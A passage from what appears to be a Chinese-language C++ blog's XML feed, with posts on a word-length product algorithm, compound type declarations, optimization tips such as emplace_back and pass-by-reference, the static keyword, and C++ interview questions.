            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> ch2 <span class="token operator">:</span> s2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch1 <span class="token operator">==</span> ch2<span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> <span class="token function">maxProduct</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> words<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">sort</span><span class="token punctuation">(</span>words<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> words<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> x<span class="token punctuation">,</span> <span class="token keyword">const</span> string<span class="token operator">&amp;</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> x<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> y<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> maxRes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> words<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> words<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>maxRes <span class="token operator">>=</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> words<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isLegal</span><span class="token punctuation">(</span>words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> words<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    maxRes <span class="token operator">=</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> words<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> maxRes<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>C++复合类型的声明</title>
    <url>/2022/03/03/C++%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A3%B0%E6%98%8E/</url>
    <content><![CDATA[<h1 id="声明语句的构成"><a href="#声明语句的构成" class="headerlink" title="声明语句的构成"></a>声明语句的构成</h1><blockquote>
<p>在 C++ 中，一条声明语句由一个<strong>基本数据类型</strong>（base type）和紧随其后的一个<strong>声明符</strong>（declarator）列表组成。</p>
</blockquote>
<span id="more"></span>

<h1 id="复合类型的声明"><a href="#复合类型的声明" class="headerlink" title="复合类型的声明"></a>复合类型的声明</h1><h2 id="定义多个变量"><a href="#定义多个变量" class="headerlink" title="定义多个变量"></a>定义多个变量</h2><p>对于基本数据类型变量的声明，声明符就是变量名。但对于复合类型来讲，例如指针类型和引用类型，变量名却只是声明符的一部分。例如 <code>int *b;</code> 需要注意的是， “*”运算符修饰的对象是变量名，而不是基本类型名。例如 <code>int *a, b; </code>，此处变量 b 的数据类型为 int，而非 int *。</p>
<h2 id="指针的引用"><a href="#指针的引用" class="headerlink" title="指针的引用"></a>指针的引用</h2><p>指针引用的正确定义形式如下：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span> b <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">&amp;</span> c <span class="token operator">=</span> b<span class="token punctuation">;</span> <span class="token comment">// c为指针b的引用</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span><span class="token operator">*</span> d <span class="token operator">=</span> b<span class="token punctuation">;</span> <span class="token comment">// 错误，d表示指向引用的指针，而引用本身并不是一个对象，无法使用指针进行指向</span></code></pre>

<p>要想正确理解一个复杂的复合类型，可以从右向左进行阅读，离变量名最近的符号越接近该变量的真实类型，如上例中的引用符。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++代码优化 Chapter1</title>
    <url>/2022/03/04/C++%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%20Chapter1/</url>
    <content><![CDATA[<p>本文将介绍一些常见的 C++ 代码优化技巧，本文为该系列的第一章，未来不定期更新。</p>
<span id="more"></span>

<h1 id="使用前置递增（递减）运算符"><a href="#使用前置递增（递减）运算符" class="headerlink" title="使用前置递增（递减）运算符"></a>使用前置递增（递减）运算符</h1><p>可能很多从 C 语言开始学习的朋友会对此感到困惑，觉得这两者在适用的情况下可以任意选择，如 for 循环语句写作 <code>for (int i = 0; i &lt; n; i++)</code> 。这样做当然没错，但会造成一定程度上的资源浪费，因为后置递增运算符需要先将原本的变量值保存下来，再对其进行递增操作，而在此 for 循环中，我们并不需要使用原本的 i 值。并且 <code>++i</code> 的写法相对来说更符合我们的意愿。</p>
<p>当然对于基本数据类型来讲，在经过编译器的优化之后，两者的效率可能并没有什么差别，但对于 STL 中的模板容器，或是自定义数据结构的迭代器来讲，前置运算符的效率显然要更高，因为单个对象所占的内存空间更大，使得拷贝暂存的开销也越大。</p>
<p> 因此，除非必要情况，应该尽可能使用前置递增（递减）运算符。</p>
<h1 id="使用引用传递"><a href="#使用引用传递" class="headerlink" title="使用引用传递"></a>使用引用传递</h1><p>引用类型变量并不是一个对象，它只是一个已存在对象的别名，因此在作为变量传递时不会经过拷贝构造的过程，能够显著地提升效率，以下为值传递的情况。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">myStruct</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">;</span>
	<span class="token function">myStruct</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">x</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">z</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	<span class="token function">myStruct</span> <span class="token punctuation">(</span><span class="token keyword">const</span> myStruct<span class="token operator">&amp;</span> ms<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">x</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">z</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"copy constructor is called!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">printMs</span><span class="token punctuation">(</span>myStruct ms<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
	std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> ms<span class="token punctuation">.</span>x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> ms<span class="token punctuation">.</span>y <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> ms<span class="token punctuation">.</span>z <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	myStruct <span class="token function">ms</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printMs</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出"copy constructor is called!"</span>
	std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>事实上，我们只是想通过调用该函数输出结构体对象的成员变量值，因此并不需要对原对象进行拷贝，这将会带来不必要的资源浪费，因此函数的参数应该使用引用传递，此外，由于函数只需要进行输出操作，而不涉及对象修改，因此参数可以加上 <strong>const</strong> 限定符，将原函数修改为 <code>void printMs(const myStruct&amp; ms)</code> .</p>
<p>我们知道 C++ 11 引入了一种新的 for 循环语句格式：<code>for (type element : array)</code>，即遍历 <strong>array</strong> 中的所有元素，因此每次循环都将执行一次 <code>element = array[i]; ++i; </code>，因此如果 <strong>element</strong> 不是引用类型，则每次循环都将进行一次拷贝，这同样会造成资源浪费。正确的写法应该是 <code>for (type&amp; element : array)</code>，如无需更改对象值，则最好加上 <strong>const</strong> 限定符。</p>
<p>此外C++ 11 还加入了自动类型推导 <strong>auto</strong> 关键字，虽然该关键字不宜滥用，但在基于范围的 for 循环中十分适用，尤其在面对一些较复杂的类型名时，可以使得代码更加简洁：<code>for (auto&amp; element : array)</code>.</p>
<h1 id="使用-emplace-替代-push"><a href="#使用-emplace-替代-push" class="headerlink" title="使用 emplace() 替代 push()"></a>使用 emplace() 替代 push()</h1><p><strong>emplace()</strong> 函数同样是 C++ 11 引入的新特性，用以替代原来的 <strong>push()</strong> 。</p>
<p>以往我们希望向 STL 模板容器中添加元素时，通常会先创建一个元素对象，再调用 push() 将其添加进容器中（此处的 push() 指的是 push_back(), push_front(), insert() 等一系列函数）。这样相当于需要先构造原对象，再拷贝该对象。但如果我们并没有事先创建这个对象，而是希望添加具有特定参数值的对象，那这样做无疑会带来不必要的性能开销，那有没有一种方法能够让我们直接在容器内构造对象呢？emplace() 就具备这样的功能，以下示例对比了 emplace_back() 和 push_back() 的使用方法，并通过重写构造函数和拷贝构造函数来追踪构造和拷贝的调用情况。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">myStruct</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">;</span>
	<span class="token function">myStruct</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">x</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">z</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"constructor is called!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">myStruct</span> <span class="token punctuation">(</span><span class="token keyword">const</span> myStruct<span class="token operator">&amp;</span> ms<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">x</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">z</span><span class="token punctuation">(</span>ms<span class="token punctuation">.</span>z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"copy constructor is called!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>myStruct<span class="token operator">></span> msVec<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">1</span></span></span>
	myStruct <span class="token function">ms</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	msVec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 输出</span>
    <span class="token comment">// constructor is called!</span>
	<span class="token comment">// copy constructor is called!</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
	msVec<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可见，push_back() 的原理如上所述，调用了一次构造函数和一次拷贝构造函数。注意，此处的 <code>#if &lt;expression&gt;  &lt;block&gt;  #endif</code> 是预处理操作，当 <code>#if</code> 后的 <code>&lt;expression&gt;</code> 为真，则执行 <code>&lt;block&gt;</code> 代码，否则不执行，因此该操作在这里用作注释。</p>
<p>当我们执行 emplace_back() 时，结果如下：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>myStruct<span class="token operator">></span> msVec<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
	myStruct <span class="token function">ms</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	msVec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">1</span></span></span>
	msVec<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 输出 constructor is called!</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>当我们希望原地构造时，emplace_back() 参数与元素对象类型的构造函数相同。同样的我们也可以传入一个已经存在的对象，这样效果和 push_back() 相同。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的静态(static)</title>
    <url>/2023/03/01/C++%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81(static)/</url>
    <content><![CDATA[<p>一般来说，C++ 中的 static 关键字具有不同的含义，而这取决于它的使用场景。</p>
<h1 id="函数内的变量"><a href="#函数内的变量" class="headerlink" title="函数内的变量"></a>函数内的变量</h1><p>我们知道，函数内作为一个局部作用域，其中定义的临时变量将会在函数执行结束后被销毁。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token operator">++</span>x<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出1</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出1</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出1</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>但我们可以通过在变量前添加 static 关键字将该其定义为一个静态变量，该静态变量的生存周期贯穿于整个程序周期，这一点类似于全局变量，但不同的是静态变量的作用域仍然保持不变，也就是整个函数体内。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">static</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token operator">++</span>x<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// x = 10; 编译出错</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出1</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出2</span>
	<span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出3</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="类内的变量或函数"><a href="#类内的变量或函数" class="headerlink" title="类内的变量或函数"></a>类内的变量或函数</h1><p>有时类需要它的成员函数与类本身直接相关，而不是与类的各个对象保持关联。在这种情况下，可用 static 关键字修饰需要与类直接相关的成员变量或成员函数，此时被修饰的类成员为所有该类的对象所通用。</p>
<p>另外，值得注意的是，类内的 static 成员变量只是声明，并没有定义，因为类内的 static 变量属于整个类，而不属于某个具体的对象，因此它无法在类被实例化为对象时通过调用构造函数及进行初始化（即分配内存空间），因此需要在类外额外对其进行初始化。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	<span class="token keyword">static</span> <span class="token keyword">int</span> sVal<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token keyword">void</span> <span class="token function">setSval</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		sVal <span class="token operator">=</span> val<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> sVal <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// 需要在类外声明，否则编译出错</span>
<span class="token keyword">int</span> Solution<span class="token double-colon punctuation">::</span>sVal<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	Solution S1<span class="token punctuation">;</span>
	Solution S2<span class="token punctuation">;</span>
	S1<span class="token punctuation">.</span><span class="token function">setSval</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	S1<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出 666</span>
	S2<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出 666</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>同时，也不难理解为什么类内的 static 函数无法访问非 static 成员。类中的非 static 函数的调用可以理解为将调用该函数的对象本身作为一个参数进行传递，如 <code>Data data1; data1.func();</code> 其实就相当于 <code>Data::func(Data&amp; data);</code>，而 static 成员函数则没有与之关联的对象，也就没有了类对象这一隐含参数，因此它也就无法访问与某个具体对象相关联的非 static 成员。</p>
<h1 id="全局的变量或函数"><a href="#全局的变量或函数" class="headerlink" title="全局的变量或函数"></a>全局的变量或函数</h1><p>当用 static 修饰全局变量或函数时，表明被修饰的变量或函数只在其所属的文件内可见，而对其他文件隐藏，这样可以避免命名冲突，提高封装性和安全性。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// file1.cpp</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token comment">// file2.cpp</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    cout <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// 输出2</span>
    <span class="token comment">// 若去掉 file1.cpp 中的 static 关键字，则出现链接错误(linker error)</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++面试题总结</title>
    <url>/2023/03/07/C++%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>由于考研失利，最近在准备春招，想要找一份游戏客户端开发的岗位，便想要将 C++ 常见的面试题整理出来。题目来自牛客网的 C++ 面试题库，答案结合了牛客网给出的参考答案、new bing 给出的回答以及个人的理解和思考。</p>
<span id="more"></span>

<h1 id="C-和-C-中-struct-的区别，以及-C-中-struct-和-class-的区别"><a href="#C-和-C-中-struct-的区别，以及-C-中-struct-和-class-的区别" class="headerlink" title="C++ 和 C 中 struct 的区别，以及 C++ 中 struct 和 class 的区别"></a>C++ 和 C 中 struct 的区别，以及 C++ 中 struct 和 class 的区别</h1><h2 id="C-和-C-中-struct-的区别"><a href="#C-和-C-中-struct-的区别" class="headerlink" title="C++ 和 C 中 struct 的区别"></a>C++ 和 C 中 struct 的区别</h2><ul>
<li>C 中 struct 只能定义成员变量，不能定义成员函数，而 C++ 中 struct 可以定义成员函数，甚至构造函数，析构函数，友元等。</li>
<li>C 中 struct 内的成员变量不可以直接初始化，而 C++ 中可以。</li>
<li>C 中使用结构体需要加上 struct 关键字，或者使用 typedef 对结构体取别名后再直接使用其别名，而 C++ 使用结构体则可以直接忽略 struct 关键字。</li>
</ul>
<h2 id="C-中-struct-和-class-的区别"><a href="#C-中-struct-和-class-的区别" class="headerlink" title="C++ 中 struct 和 class 的区别"></a>C++ 中 struct 和 class 的区别</h2><ul>
<li>class 的成员默认是 private 的，而 struct 的成员默认是 public 的。</li>
<li>class 继承默认是 private 继承，而 struct 继承默认是 public 继承。</li>
</ul>
<h1 id="static-关键字的作用"><a href="#static-关键字的作用" class="headerlink" title="static 关键字的作用"></a>static 关键字的作用</h1><ul>
<li>static 可以修饰全局变量和函数，使它们只在本文件内可见，隐藏于其他文件。</li>
<li>static 可以修饰局部变量，使它们具有静态存储期，只初始化一次，且在函数调用结束后不销毁。</li>
<li>static 可以修饰类的成员变量和成员函数，使它们属于类而不属于对象，可以直接通过类名访问，且只有一份内存空间。</li>
</ul>
<h1 id="什么是野指针，怎么产生，如何避免"><a href="#什么是野指针，怎么产生，如何避免" class="headerlink" title="什么是野指针，怎么产生，如何避免"></a>什么是野指针，怎么产生，如何避免</h1><h2 id="什么是野指针"><a href="#什么是野指针" class="headerlink" title="什么是野指针"></a>什么是野指针</h2><p>野指针是指指向不可用内存的指针，可能会导致内存泄漏和程序崩溃。</p>
<h2 id="野指针如何产生"><a href="#野指针如何产生" class="headerlink" title="野指针如何产生"></a>野指针如何产生</h2><ul>
<li>指针定义时未被初始化，指向随机的内存地址。</li>
<li>使用 delete 释放内存空间后指针未被置空，指向已释放的内存地址。</li>
<li>数组越界，指向非法的内存地址。</li>
</ul>
<h2 id="野指针如何避免"><a href="#野指针如何避免" class="headerlink" title="野指针如何避免"></a>野指针如何避免</h2><ul>
<li>指针定义时尽量初始化，或者赋值为 nullptr。</li>
<li>使用 delete 释放内存空间后要将指针及时置空，或者使用智能指针。</li>
<li>指针操作时注意边界检查，避免越界。</li>
</ul>
<h1 id="C-和-C-的区别"><a href="#C-和-C-的区别" class="headerlink" title="C 和 C++ 的区别"></a>C 和 C++ 的区别</h1><ul>
<li>C 是一种面向过程的语言，而 C++ 是一种面向对象的语言，支持类和对象的概念。</li>
<li>C++ 包含了 C 的大部分语法，同时增加了一些新的特性，如继承、多态、模板、异常处理等。</li>
<li>C 使用 malloc 和 free 函数进行内存的动态分配和释放，C++ 则使用 new 和 delete 运算符。</li>
<li>C 只有局部和全局两个作用域，而 C++ 中有局部、全局、类、命名空间。</li>
</ul>
